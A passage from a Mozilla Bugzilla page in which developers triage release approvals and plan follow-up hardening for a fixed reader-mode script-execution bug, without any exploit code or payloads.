          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c56">Comment 56</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 01:31 PDT" data-time="1442219466">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-56">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-56" data-comment-id="10726540">Comment on <span class=""><a href="/attachment.cgi?id=8658707" name="attach_8658707" title="Fix nsTreeSanitizer">attachment 8658707</a> <a href="/attachment.cgi?id=8658707&amp;action=edit" title="Fix nsTreeSanitizer">[details]</a> <a href="/attachment.cgi?id=8658707&amp;action=diff" title="Fix nsTreeSanitizer">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8658707'>[review]</a>
Fix nsTreeSanitizer

I don't think this matches the ESR criteria.
Ritu will make the call for 41.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: <span class="activity-deleted">approval-mozilla-esr38?</span></div><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: approval-mozilla-esr38-</div><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: <span class="activity-deleted">approval-mozilla-aurora?</span></div><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: approval-mozilla-aurora+</div></div></div><div class="change-set" id="a5597001_495955"><div class="change" id="aa5597001_495955">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_495955" id="a5597001_495955"><img src="https://secure.gravatar.com/avatar/5aa2e382197a147b42d020b6878f8623?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_495955" id="a5597001_495955"><a class="email " href="/user_profile?user_id=495955" > <span class="fna">Sylvestre Ledru [:Sylvestre]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5597001_495955"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5597001_495955">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5597001_495955">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 01:31 PDT" data-time="1442219475">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: approval-mozilla-aurora? &rarr; approval-mozilla-aurora+</div></div></div><div class="change-set" id="c57"><div class="comment" data-id="10726850" data-no="57"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-57" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a5597001_495955"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a5597001_495955"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-57"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-57" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c57">Comment 57</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 03:31 PDT" data-time="1442226683">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-57">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-57" data-comment-id="10726850">(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c55">comment #55</a>)
<span class="quote">&gt; Thinking over these bits again..
&gt; 
&gt; (In reply to Daniel Veditz [:dveditz] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Passive script execution on about:reader via SVG animations (affects: Firefox, NoScript, CSP; impact: spoofing, phishing)"
   href="/show_bug.cgi?id=1182778#c42">comment #42</a>)
&gt; &gt; …
&gt; &gt; When you put the content into an about:something URL it gets different
&gt; &gt; powers than we've thought through. For instance it can link to or frame
&gt; &gt; &quot;about:config&quot;, a chrome-privileged window. We've had several
&gt; &gt; vulnerabilities in the past that were mitigated by the inability of web
&gt; &gt; content to link to or otherwise manipulate a chrome-privileged window. It's
&gt; &gt; not same-origin and it /should/ be safe, but we've had many vulnerabilities
&gt; &gt; that this kind of set up turned from a same-origin violation into arbitrary
&gt; &gt; code execution. That argues for sanitizing the content within an inch of its
&gt; &gt; life.
&gt; &gt; 
&gt; &gt; What's the alternative? Trying to copy over the CSP (converting 'self' to
&gt; &gt; the original origin, modifying directives like style-src that get in your
&gt; &gt; way) would protect against this case where the script wasn't supposed to be
&gt; &gt; there, that it's an attack from some 3rd party on the page. It would not,
&gt; &gt; however, protect against a malicious page trying to use about:reader to
&gt; &gt; crack Firefox open -- such a page would simply avoid having a CSP.
&gt; &gt; 
&gt; 
&gt; ...I am not sure if we already want to close this bug. Though I want to note
&gt; that the reader mode currently removes links to the about scheme.</span >

Can you elaborate on what you think still needs fixing? I think if we do have more followup issues, IMO they should get their own bugs - juggling the two patches in this bug with uplift requests will be enough &quot;fun&quot; as it is. :-(

For context, my impression is that the sanitizing of the reader mode content that we currently do ought to be sufficient to prevent all script from running. The only thing I can think of offhand that we may or may not care about a lot would be style/img directives in the original page that get ignored with the CSP, and get used when the CSP is inactive. As I've noted elsewhere, moving stuff into an iframe so we can set sandboxing attributes is possible, but not entirely trivial, and that too I would prefer to do in a different bug.</pre><div class="activity"><div class="change">Flags: needinfo?(fbraun)</div></div></div><div class="change-set" id="c58"><div class="comment" data-id="10726879" data-no="58"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-58" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a5597001_495955"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a5597001_495955"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-58"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-58" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c58">Comment 58</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 03:43 PDT" data-time="1442227403">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-58">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-58" data-comment-id="10726879">OK, let's file a follow-up that does hardens stuff using a sandbox and/or retains the existing CSP.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(fbraun)</span></div></div></div><div class="change-set" id="c59"><div class="comment" data-id="10727650" data-no="59"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-59" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_277293" id="a5597001_495955"><img src="https://secure.gravatar.com/avatar/8378311bf1bd5e9eddc7896a07688876?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_277293" id="a5597001_495955"><a class="email disabled" href="/user_profile?user_id=277293" > <span class="fna">Carsten Book [:Tomcat]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-59"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-59" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c59">Comment 59</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 07:21 PDT" data-time="1442240482">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-59">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-59" data-comment-id="10727650"><a rel="nofollow" href="https://hg.mozilla.org/releases/mozilla-aurora/rev/9aa5dcad9aba">https://hg.mozilla.org/releases/mozilla-aurora/rev/9aa5dcad9aba</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox42&amp;o1=isnotempty">status-firefox42</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox42&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox42&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="a5630193_1689"><div class="change" id="aa5630193_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a5630193_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a5630193_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5630193_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5630193_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5630193_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 10:44 PDT" data-time="1442252667">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: toolkit-core-security &rarr; core-security-release</div></div></div><div class="change-set" id="c60"><div class="comment" data-id="10728875" data-no="60"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-60" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_538805" id="a5630193_1689"><img src="https://secure.gravatar.com/avatar/9bd092443d615af36b31b04e81ad7806?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_538805" id="a5630193_1689"><a class="email disabled" href="/user_profile?user_id=538805" > <span class="fna">Ritu Kothari (:ritu) (Inactive, please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-60"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-60" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c60">Comment 60</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 11:30 PDT" data-time="1442255427">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-60">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-60" data-comment-id="10728875">Comment on <span class=""><a href="/attachment.cgi?id=8643570" name="attach_8643570" title="Patch v3">attachment 8643570</a> <a href="/attachment.cgi?id=8643570&amp;action=edit" title="Patch v3">[details]</a> <a href="/attachment.cgi?id=8643570&amp;action=diff" title="Patch v3">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8643570'>[review]</a>
Patch v3

Taking any patches at this point in RC is very risky. The criteria is limited to critical sec issues that are easily exploitable, issues impacting a significant set of end-users, major regressions during beta cycle, crash/hang up spikes, etc. This bug does not meet that criteria. It is too late to take a fix in 41 for this.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: approval-mozilla-beta? &rarr; approval-mozilla-beta-</div></div></div><div class="change-set" id="c61"><div class="comment" data-id="10728886" data-no="61"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-61" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_538805" id="a5630193_1689"><img src="https://secure.gravatar.com/avatar/9bd092443d615af36b31b04e81ad7806?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_538805" id="a5630193_1689"><a class="email disabled" href="/user_profile?user_id=538805" > <span class="fna">Ritu Kothari (:ritu) (Inactive, please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-61"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-61" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c61">Comment 61</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 11:31 PDT" data-time="1442255519">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-61">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-61" data-comment-id="10728886">Comment on <span class=""><a href="/attachment.cgi?id=8658707" name="attach_8658707" title="Fix nsTreeSanitizer">attachment 8658707</a> <a href="/attachment.cgi?id=8658707&amp;action=edit" title="Fix nsTreeSanitizer">[details]</a> <a href="/attachment.cgi?id=8658707&amp;action=diff" title="Fix nsTreeSanitizer">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8658707'>[review]</a>
Fix nsTreeSanitizer

Please see my previous Beta- comment.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8658707&amp;action=edit"
           title="Fix nsTreeSanitizer"
           class=""
        >Attachment #8658707</a> -
        Flags: approval-mozilla-beta? &rarr; approval-mozilla-beta-</div></div></div><div class="change-set" id="a5633330_538805"><div class="change" id="aa5633330_538805">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_538805" id="a5633330_538805"><img src="https://secure.gravatar.com/avatar/9bd092443d615af36b31b04e81ad7806?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_538805" id="a5633330_538805"><a class="email disabled" href="/user_profile?user_id=538805" > <span class="fna">Ritu Kothari (:ritu) (Inactive, please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5633330_538805"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5633330_538805">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5633330_538805">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-14 11:36 PDT" data-time="1442255804">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox41&amp;o1=isnotempty">status-firefox41</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox41&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox41&amp;o1=equals&amp;v1=wontfix">wontfix</a></div></div></div><div class="change-set" id="a5684417_159069"><div class="change" id="aa5684417_159069">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a5684417_159069"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_159069" id="a5684417_159069"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5684417_159069"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5684417_159069">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5684417_159069">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-15 01:48 PDT" data-time="1442306891">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_NEW"
   title="NEW - Move readerized content into a sandboxed iframe"
   href="/show_bug.cgi?id=1204818">1204818</a></div></div></div><div class="change-set" id="a5975368_1689"><div class="change" id="aa5975368_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a5975368_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a5975368_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a5975368_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a5975368_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a5975368_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-18 10:37 PDT" data-time="1442597842">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: sec-bounty? &rarr; sec-bounty+</div></div></div><div class="change-set" id="c62"><div class="comment" data-id="10761761" data-no="62"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-62" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_159069" id="a5975368_1689"><img src="https://secure.gravatar.com/avatar/66445733c06687eafa2978764675104f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_159069" id="a5975368_1689"><a class="email " href="/user_profile?user_id=159069" > <span class="fna">:Gijs (he/him)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-62"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-62" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c62">Comment 62</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-22 10:45 PDT" data-time="1442943921">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-62">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-62" data-comment-id="10761761">Comment on <span class=""><a href="/attachment.cgi?id=8643570" name="attach_8643570" title="Patch v3">attachment 8643570</a> <a href="/attachment.cgi?id=8643570&amp;action=edit" title="Patch v3">[details]</a> <a href="/attachment.cgi?id=8643570&amp;action=diff" title="Patch v3">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8643570'>[review]</a>
Patch v3

Approval Request Comment
see earlier approval request + the discussion in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - URL spoofing in reader mode"
   href="/show_bug.cgi?id=1195976">bug 1195976</a>, where we now drop out of reader mode in certain cases because that patch depended on this patch, and this patch didn't make 41.</pre><div class="activity"><div class="change">Flags: needinfo?(rkothari)</div><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: approval-mozilla-release?</div></div></div><div class="change-set" id="c63"><div class="comment" data-id="10763278" data-no="63"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-63" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_538805" id="a5975368_1689"><img src="https://secure.gravatar.com/avatar/9bd092443d615af36b31b04e81ad7806?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_538805" id="a5975368_1689"><a class="email disabled" href="/user_profile?user_id=538805" > <span class="fna">Ritu Kothari (:ritu) (Inactive, please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-63"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-63" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c63">Comment 63</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-22 16:03 PDT" data-time="1442963031">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-63">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-63" data-comment-id="10763278">Thanks Gijs! I will leave the m-r:? request untouched for ~a week and when we are closer to gtb dot release, I will review and approve if deemed safe.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(rkothari)</span></div></div></div><div class="change-set" id="c64"><div class="comment" data-id="10784928" data-no="64"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-64" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_538805" id="a5975368_1689"><img src="https://secure.gravatar.com/avatar/9bd092443d615af36b31b04e81ad7806?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_538805" id="a5975368_1689"><a class="email disabled" href="/user_profile?user_id=538805" > <span class="fna">Ritu Kothari (:ritu) (Inactive, please n-i to RyanVM, jcristau, or pascal)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-64"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-64" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#c64">Comment 64</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-09-28 12:16 PDT" data-time="1443467761">6 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-64">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-64" data-comment-id="10784928">Comment on <span class=""><a href="/attachment.cgi?id=8643570" name="attach_8643570" title="Patch v3">attachment 8643570</a> <a href="/attachment.cgi?id=8643570&amp;action=edit" title="Patch v3">[details]</a> <a href="/attachment.cgi?id=8643570&amp;action=diff" title="Patch v3">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1182778&amp;attachment=8643570'>[review]</a>
Patch v3

I discussed this with Al a bit and based on our discussion the severity of this issue does not meet the RC bar which is major regressions, major crash/hang issues, data loss without workarounds. Given that I do not feel comfortable taking this fix in m-r. Thanks!</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8643570&amp;action=edit"
           title="Patch v3"
           class=""
        >Attachment #8643570</a> -
        Flags: approval-mozilla-release? &rarr; approval-mozilla-release-</div></div></div><div class="change-set" id="a8926650_452604"><div class="change" id="aa8926650_452604">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_452604" id="a8926650_452604"><img src="https://secure.gravatar.com/avatar/7bb698c4991c5af83adabe3c3b8ee8aa?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_452604" id="a8926650_452604"><a class="email disabled" href="/user_profile?user_id=452604" > <span class="fna">Matt Wobensmith [:mwobensmith][:matt:]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a8926650_452604"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a8926650_452604">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a8926650_452604">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-10-22 14:25 PDT" data-time="1445549124">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Whiteboard: [post-critsmash-triage]</div></div></div><div class="change-set" id="a9017182_280903"><div class="change" id="aa9017182_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a9017182_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a9017182_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a9017182_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a9017182_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1182778#a9017182_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2015-10-23 15:34 PDT" data-time="1445639656">6 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_firefox_esr38&amp;o1=isnotempty">status-firefox-esr38</a>:
          <a href="/buglist.cgi?f1=cf_status_firefox_esr38&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_firefox_esr38&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">Whiteboard: [post-critsmash-triage] &rarr; [post-critsmash-triage][adv-main42+]</div></div></div><div class="change-set" id="a9439680_280903"><div class="change" id="aa9439680_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a9439680_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a9439680_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a9439680_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
